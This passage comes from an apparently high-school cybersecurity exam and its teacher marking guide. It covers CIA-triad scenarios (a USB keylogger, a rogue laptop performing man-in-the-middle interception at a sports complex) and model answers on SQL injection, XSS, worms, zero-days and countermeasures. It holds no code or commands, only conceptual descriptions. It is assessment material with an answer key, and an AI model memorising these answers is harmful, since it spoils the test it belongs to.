An administrative clerk working at a desk next to an open window in a temporary sports clubhouse leaves their station unlocked to assist an athlete on the track. An unauthorized spectator walks past the open window, plugs a physical USB keystroke logger into the back of the computer, and departs unnoticed.
*   (a) Identify which element of the CIA Triad is directly compromised. *(1 Mark)*
*   (b) Suggest **two** distinct physical security controls that would prevent this compromise from occurring in a temporary field environment. *(2 Marks)*

---

#### **Section B: Case Study Analysis (8 Marks)**

Read the following scenario and answer the questions that follow:

The IT manager of a regional sports complex in Western Australia, *Midwest Sports Association*, receives reports that users are receiving browser alerts stating their connections are insecure when trying to load the official leaderboards. 
Upon inspecting the network switches, the manager discovers a rogue laptop plugged directly into an unlabelled RJ45 wall port in the equipment room. The rogue laptop has been configured to perform **IP Spoofing** and is intercepting communications between the local database server and the timing desks at the athletic tracks, collecting user credentials.

**Question 5 (8 Marks)**
Analyze this cybersecurity breach using the curriculum framework:
*   (a) Identify the specific category of cyberattack being executed on the network data-path. *(1 Mark)*
*   (b) Evaluate the security failure using the **CIA Triad**, identifying which element was compromised and why. *(3 Marks)*
*   (c) Formulate **two** technical or organizational countermeasures to neutralize this active exploit. Justify your suggestions. *(4 Marks)*

---

### **Teacher Marking Guide & Solutions**

#### **Section A Answers**

**Question 1 Solution**
*   **SQL Injection (SQLi)** targets the **backend SQL database engine** *(1 Mark)*. Its impact is the unauthorized reading, modification, or deletion of database records, or bypassing user logins *(1/2 Mark)*.
*   **Cross-Site Scripting (XSS)** targets the **client-side user browser** *(1 Mark)*. Its impact is the execution of malicious scripts within a victim's browser to steal session cookies, hijack user sessions, or redirect pages *(1/2 Mark)*.

**Question 2 Solution**
*   (a) **Worm** *(1 Mark)*.
*   (b) A worm is defined by its ability to **self-replicate automatically** across network connections *(1 Mark)* without requiring a human host file interaction (such as a user executing a program) *(1 Mark)*.

**Question 3 Solution**
*   A **zero-day vulnerability** is an unpatched software flaw that is completely unknown to the vendor or developer, leaving no time to prepare defenses before active exploits begin *(1 Mark)*.
*   Traditional antivirus software relies on **known signatures** (unique patterns of known malware code) to detect threats *(1 Mark)*. Because a zero-day is brand new and unlogged, no signature exists in the database, allowing it to pass through antivirus scanning undetected *(1 Mark)*.

**Question 4 Solution**
*   (a) **Confidentiality** (due to the potential reading of logged keystrokes/passwords) or **Integrity** (due to unauthorized system tampering) *(1 Mark)*.
*   (b) *Accept any two of the following physical controls (1 Mark each):*
    *   Locked computer casings / server racks.
    *   Physical RJ45/USB port block-out locks.
    *   Enforcing automatic screen lockouts (configured to execute after 1 minute of inactivity).
    *   Restricting physical window access using security screens or window locks.

---

#### **Section B Answers (Case Study)**

**Question 5 Solution**
*   (a) **Man-in-the-Middle (MitM)** attack *(1 Mark)*.
*   (b) **Confidentiality** is compromised *(1 Mark)* because the attacker is actively intercepting and reading user credentials and timing data in transit *(1 Mark)*. **Availability** may also be threatened if packets are delayed or blocked, but the primary breach of capturing data represents a confidentiality failure *(1 Mark)*.
*   (c) *Award up to 4 Marks (2 Marks per justified countermeasure):*
    *   **Countermeasure 1: Mandate HTTPS / Transport Layer Security (TLS)** *(1 Mark)*.
        *   *Justification:* TLS encrypts data packets at the transport boundary before they are sent. Even if the attacker intercepts packets on the rogue laptop, they will only read encrypted cipher text, preserving credential confidentiality *(1 Mark)*.
    *   **Countermeasure 2: Enforce Physical Port Security / MAC Address Filtering** *(1 Mark)*.
        *   *Justification:* Configure the network switch to shut down any physical port if an unrecognized MAC address is plugged in, or physically lock the equipment room containing the wall ports to block intruder access *(1 Mark)*.

---
